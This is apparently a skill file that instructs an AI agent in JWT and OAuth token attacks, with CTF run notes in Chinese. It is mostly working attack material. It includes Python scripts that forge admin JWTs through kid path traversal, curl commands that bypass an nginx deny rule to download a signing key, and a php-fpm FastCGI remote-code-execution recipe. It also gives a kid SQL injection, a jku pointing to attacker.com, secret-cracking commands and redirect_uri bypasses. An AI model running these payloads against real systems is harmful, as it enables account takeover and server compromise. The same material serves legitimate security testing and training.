
# SKILL: JWT and OAuth 2.0 Token Attacks — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert authentication token attacks. Covers JWT cryptographic attacks (alg:none, RS256→HS256, secret crack, kid/jku injection), OAuth flow attacks (CSRF, open redirect, token theft, implicit flow abuse), PKCE bypass, and token leakage via Referer/logs. This is critical for modern web applications.

## 0. RELATED ROUTING

Use this file for token-centric attacks and flow abuse. Also load:

- [oauth oidc misconfiguration](../oauth-oidc-misconfiguration/SKILL.md) for redirect URI, state, nonce, PKCE, and account-binding validation
- [cors cross origin misconfiguration](../cors-cross-origin-misconfiguration/SKILL.md) when browser-readable APIs or token leakage may exist cross-origin
- [saml sso assertion attacks](../saml-sso-assertion-attacks/SKILL.md) when the target uses enterprise SSO outside OAuth/OIDC

**穷举参考**：需要完整 CVE 编号、jwt_tool/hashcat 精确语法、PortSwigger labs 清单时，
查 payloads skill 的 `references/json-web-token.md`。本文件是权威实战 playbook——新的
攻击流程与赛题技巧只写进这里，那份只做静态语料参考。

### 最短成功链（CloudFunc / kid=prod.key，a-18 实测）

1. `kid=../css/reset.css`，HMAC 密钥 = **reset.css 全文**（勿 strip）→ 伪造 `role=admin`
2. `php_code.execute` 试不通（PHP 把 `.` 转 `_`）→ 转第 3 条 FastCGI
3. 扫 **php-fpm:9000** → FastCGI（`auto_prepend_file=php://input`）RCE
4. flag 常在本机 metadata unix socket（响应头 `CloudFuncMetadata/1.0`）

细节见下方 §5「a-18 实测活路」与「php_code 不通 / FastCGI」。

如果文件不存在的话通过搜索引擎去搜索下

---

## 1. JWT ANATOMY

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
└─────────────────────┘ └────────────────────────────┘ └──────────────────────────────────────────┘
         HEADER                     PAYLOAD                           SIGNATURE
```

**Decode in terminal**:
```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# → {"alg":"HS256","typ":"JWT"}

echo "eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0" | base64 -d
# → {"userId":1234,"role":"user"}
```

**Common claim targets** (modify to escalate):
```json
{
  "role": "admin",
  "isAdmin": true,
  "userId": OTHER_USER_ID,
  "email": "victim@target.com",
  "sub": "admin",
  "permissions": ["admin", "write", "delete"],
  "tier": "premium"
}
```

---

## 2. ATTACK 1 — ALGORITHM NONE (alg:none)

Server doesn't validate signature when algorithm is "none"/"None"/"NONE":

```bash
# Burp JWT Editor / python-jwt attack:
# Step 1: Decode header
echo '{"alg":"HS256","typ":"JWT"}' | base64 → old_header

# Step 2: Create new header
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'

# Step 3: Modify payload (e.g., role → admin):
echo -n '{"userId":1234,"role":"admin"}' | base64 | tr -d '=' | tr '/+' '_-'

# Step 4: Construct token with empty signature:
HEADER.PAYLOAD.
# OR:
HEADER.PAYLOAD
```

**Tool (jwt_tool)**:
```bash
python3 jwt_tool.py JWT_TOKEN -X a
# → automatically generates alg:none variants
```

---

## 3. ATTACK 2 — RS256 TO HS256 KEY CONFUSION

**When server uses RS256** (asymmetric — RSA private key signs, public key verifies):
- Server's public key is often discoverable (JWKS endpoint, `/certs`, source code)
- Attack: tell server "this is HS256" → server verifies HS256 HMAC using **the public key as secret**

```bash
# Step 1: Obtain public key (PEM format)
# From: /api/.well-known/jwks.json → convert to PEM
# From: /certs endpoint
# From: OpenSSL extraction from HTTPS cert

# Step 2: Use jwt_tool to sign with HS256 using public key as secret:
python3 jwt_tool.py JWT_TOKEN -X k -pk public_key.pem

# Step 3: Manually:
# Modify header: {"alg":"HS256","typ":"JWT"}
# Sign entire header.payload with HMAC-SHA256 using PEM public key bytes
```

---

## 4. ATTACK 3 — JWT SECRET BRUTE FORCE

HMAC-based JWTs (HS256/HS384/HS512) with weak secret:

```bash
# hashcat (fast):
hashcat -a 0 -m 16500 "JWT_TOKEN_HERE" /usr/share/wordlists/rockyou.txt

# john:
echo "JWT_TOKEN_HERE" > jwt.txt
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt

# jwt_tool:
python3 jwt_tool.py JWT_TOKEN -C -d /path/to/wordlist.txt
```

**Common weak secrets to test manually**:
```
secret, password, 123456, qwerty, changeme, your-256-bit-secret,
APP_NAME, app_name, production, jwt_secret, SECRET_KEY
```

---

## 5. ATTACK 4 — kid (Key ID) INJECTION

> ⚠️ **run-13844 a-18**：拿到 `kid:"prod.key"` 后只 load 了 `serverless.md`，用 high 推理盲猜。
> **看到 `kid`→`prod.key` 的第一步必须是本节路径遍历读密钥**，再 HS256 伪造；不要先猜空 kid/none。

### ✅ a-18 实测活路（优先于 `/keys/` deny 绕过）

CloudFunc 类题密钥路径 = `DOCROOT/keys/{kid}`。**不要死磕下载 `prod.key`**：把 `kid`
改成可读的静态文件，HMAC 密钥 = 该文件全文：

```bash
# kid=../css/reset.css → 密钥 = reset.css 全文（实测 ~1418 字节）→ 伪造任意 role
python3 - <<'PY'
import hmac, hashlib, base64, json, urllib.request
TARGET = "http://TARGET"
css = urllib.request.urlopen(TARGET + "/css/reset.css").read()  # 原样字节，勿 strip 改动
def b64(d): return base64.urlsafe_b64encode(json.dumps(d, separators=(",", ":")).encode()).rstrip(b"=")
h = b64({"alg": "HS256", "typ": "JWT", "kid": "../css/reset.css"})
p = b64({"email": "admin@example.com", "role": "admin"})
s = base64.urlsafe_b64encode(hmac.new(css, h + b"." + p, hashlib.sha256).digest()).rstrip(b"=")
print(f"{h.decode()}.{p.decode()}.{s.decode()}")
PY
```

其它可读静态文件（`../js/app.js`、`../favicon.ico`）同理。拿到 admin JWT 后：
**`php_code.execute` 不通**（点号转下划线，见下），转 **php-fpm:9000 FastCGI RCE**。

The `kid` header parameter specifies which key to use for verification. No sanitization = injection:

### kid SQL Injection
```json
{"alg":"HS256","kid":"' UNION SELECT 'attacker_controlled_key' FROM dual--"}
```
If backend queries SQL: `SELECT key FROM keys WHERE kid = 'INPUT'`  
Result: HMAC key = `'attacker_controlled_key'` → forge any payload signed with this value.

### kid Path Traversal (file read)
```json
{"alg":"HS256","kid":"../../../../dev/null"}
```
Server reads `/dev/null` as key → empty string → sign token with empty HMAC.

```json
{"alg":"HS256","kid":"../../../../etc/hostname"}
```
Server reads hostname as key → forge tokens signed with hostname string.

### 密钥文件被 deny（403）时的路径归一化绕过

JWT 的 `kid` 常指向 `prod.key` 这类密钥文件，而密钥文件往往在 webroot 下的
`/keys/`、`/secret/` 等目录，被 nginx `location /keys/ { deny all; }` 拒绝（返回 403）。
**403 说明文件存在但被 deny——这是路径归一化绕过的信号，不是终点**：

```bash
# 对比 403 vs 404：403=存在但被 deny，404=归一化逃出了 deny 前缀（绕过命中）
curl -s -o /dev/null -w "%{http_code}\n" http://TARGET/keys/prod.key           # 403 基准
curl -s -o /dev/null -w "%{http_code}\n" "http://TARGET/keys/.%2e/prod.key"    # 404=命中！
curl -s -o /dev/null -w "%{http_code}\n" "http://TARGET/keys/../keys/prod.key"
curl -s -o /dev/null -w "%{http_code}\n" "http://TARGET/keys/./prod.key"
curl -s -o /dev/null -w "%{http_code}\n" "http://TARGET/keys../prod.key"       # off-by-slash
# 绕过成功后直接下载密钥内容：
curl -s "http://TARGET/keys/.%2e/prod.key" > /tmp/prod.key
# 然后用该密钥伪造 admin JWT：
python3 -c "
import hmac, hashlib, base64, json
def b64(d): return base64.urlsafe_b64encode(json.dumps(d,separators=(',',':')).encode()).rstrip(b'=')
key=open('/tmp/prod.key','rb').read().strip()
h=b64({'alg':'HS256','typ':'JWT','kid':'prod.key'})
p=b64({'email':'admin@example.com','role':'admin'})
s=base64.urlsafe_b64encode(hmac.new(key,h.encode()+b'.'+p.encode(),hashlib.sha256).digest()).rstrip(b'=')
print(f'{h.decode()}.{p.decode()}.{s.decode()}')
"
```

**关键**：`%2e` 解码为 `.` 后，nginx 路径归一化把 `/.%2e/` 折叠成 `/`，使请求逃出
`/keys/` 的 deny location。403→404 的状态码跳变就是逃逸成功。同主机若还有 LFI/静态
目录穿越（如 `/public/static/../../`），也能读 PHP 源码找硬编码密钥。

### 拿到 admin 后：优先 php-fpm FastCGI（规则引擎 `php_code.execute` 不通）

CloudFunc 类题（a-18）拿到 admin JWT 后，规则引擎表单字段 `php_code.execute` **无法通过
POST 提交**：PHP 5.6/8.x 一律把 POST/GET/COOKIE 键名中的 `.` 转成 `_`，服务端
`$_POST['php_code.execute']` 永远读不到（实际只收到 `php_code_execute`）。
urlencoded/multipart/%2E/嵌套 `php_code[execute]`/JSON/raw/GET 都试不通就转下一条活路。

**✅ 实测成功的活路（a-18，83 轮解出）——规则引擎不通，转 php-fpm FastCGI**：
1. 扫同主机其他端口，找 **php-fpm 9000 端口**（CloudFunc 常暴露 php-fpm）；
2. 用 FastCGI 直接打 php-fpm：`PHP_VALUE=auto_prepend_file=php://input` + PHP 代码体，
   即得 **RCE as www-data**（绕过 web 入口和规则引擎）；
3. flag 往往不在文件里，而在本地 **unix socket 的 metadata 服务**
   （响应头 `CloudFuncMetadata/1.0 Python/3.5.3`）；用 FastCGI 执行 PHP 去读该 socket 拿 flag。

FastCGI 攻击：自写 `fcgi_exploit.py`（构造 FCGI_BEGIN_REQUEST + FCGI_PARAMS，
PARAMS 里 `SCRIPT_FILENAME` 指向存在的 php 文件、`PHP_VALUE=auto_prepend_file=php://input`，
请求体就是要执行的 PHP 代码），连 9000 端口发送即可。

**判读**：php-fpm 9000 端口开放 = 直接 FastCGI RCE，优先级高于规则引擎；先 `nc -v 9000`
确认端口再打，别在 web 表单的 php_code 参数上继续磨。

---

## 6. ATTACK 5 — jku / x5u Header Injection

`jku` points to JSON Web Key Set URL. If not whitelisted:
```json
{"alg":"RS256","jku":"https://attacker.com/malicious-jwks.json","kid":"my-key"}
```

**Setup**:
```bash
# Generate RSA key pair:
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# Create JWKS:
python3 -c "
import json, base64, struct
# ... (use python-jwcrypto or jwt_tool to export JWKS)
"

# Host malicious JWKS at attacker.com/malicious-jwks.json
# Sign JWT with attacker's private key
# Server fetches attacker's JWKS → verifies with attacker's public key → accepts
```

**jwt_tool automation**:
```bash
python3 jwt_tool.py JWT -X s -ju https://attacker.com/malicious-jwks.json
```

---

## 7. OAUTH 2.0 — STATE PARAMETER MISSING (CSRF)

State parameter prevents CSRF in OAuth. If missing:

```
Attack:
1. Click "Login with Google" → OAuth starts → intercept the redirect URL:
   https://accounts.google.com/oauth2/auth?client_id=APP_ID&redirect_uri=https://target.com/callback&state=MISSING_OR_PREDICTABLE&code=...

2. Get the authorization code (stop before exchanging it)
3. Craft URL: https://target.com/oauth/callback?code=ATTACKER_CODE
4. Victim clicks that URL → their session binds to ATTACKER's OAuth identity
→ ACCOUNT TAKEOVER
```

---

## 8. OAUTH — REDIRECT_URI BYPASS

Authorization codes are sent to `redirect_uri`. If validation is weak:

### Open Redirect in redirect_uri
```
Original: redirect_uri=https://target.com/callback
Attack:   redirect_uri=https://target.com/callback/../../../attacker.com
          redirect_uri=https://attacker.com.target.com/callback
          redirect_uri=https://target.com@attacker.com/callback
```

### Partial Path Match
```
Whitelist: https://target.com/callback
Attack: https://target.com/callback%2f../admin (URL path confusion)
        https://target.com/callbackXSS (prefix match only)
```

### Localhost / Development Redirect
```
redirect_uri=http://localhost/steal
redirect_uri=urn:ietf:wg:oauth:2.0:oob  (mobile apps)
```

---

## 9. OAUTH — IMPLICIT FLOW TOKEN THEFT

Implicit flow: token sent in URL fragment `#access_token=...`

**Fragment leakage scenarios**:
- Redirect to attacker page: fragment accessible via `document.referrer` or via `<script>window.location.href</script>` in target page
- Open redirect: `redirect_uri=https://target.com/open-redirect?url=https://attacker.com` → token in fragment lands at attacker's page

---

## 10. OAUTH — SCOPE ESCALATION

Request broader scope than authorized in authorization code:
```
Authorized scope: read:profile
Attack: During token exchange, add scope=admin or scope=read:admin
→ Does server grant requested scope or issued scope?
```

---

## 11. TOKEN LEAKAGE VECTORS

### Referer Header
Token in URL → page loads external resource → Referer leaks token:
```
https://target.com/dashboard#access_token=TOKEN
→ HTML loads: <img src="https://analytics.third-party.com/track">
→ Referer: https://target.com/dashboard#access_token=TOKEN
→ analytics.third-party.com sees token in Referer logs
```

### Server Logs
Access tokens sent in query parameters are stored in:
```
/var/log/nginx/access.log
/var/log/apache2/access.log
ELB/ALB logs (AWS)
CloudFront logs
CDN logs
```

---

## 12. JWT TESTING CHECKLIST

```
□ Decode header + payload (base64 decode each part)
□ Identify algorithm: HS256/RS256/ES256/none
□ Modify payload fields (role, userId, isAdmin) → change signature too
□ Test alg:none → remove signature entirely
□ If RS256: find public key → attempt RS256→HS256 confusion
□ If HS256: brute force with hashcat/rockyou
□ Check kid parameter → try SQL injection + path traversal
□ Check jku/x5u header → redirect to attacker JWKS
□ Test token reuse after logout
□ Test expired token acceptance (exp claim)
□ Check for token in GET params (log leakage) vs header
```

---

## 13. OAUTH TESTING CHECKLIST

```
□ Check for state parameter in authorization request
□ Test redirect_uri manipulation (open redirect, prefix match, path confusion)
□ Can tokens be exchanged more than once?
□ Test scope escalation during token exchange
□ Implicit flow: check for token in Referer/history
□ PKCE: can code_challenge be bypassed or code_verifier be empty?
□ Check for authorization code reuse (code must be single-use)
□ Test account linking abuse: link OAuth to existing account with same email
□ Check OAuth provider confusion: use Apple ID to link where Google expected
```
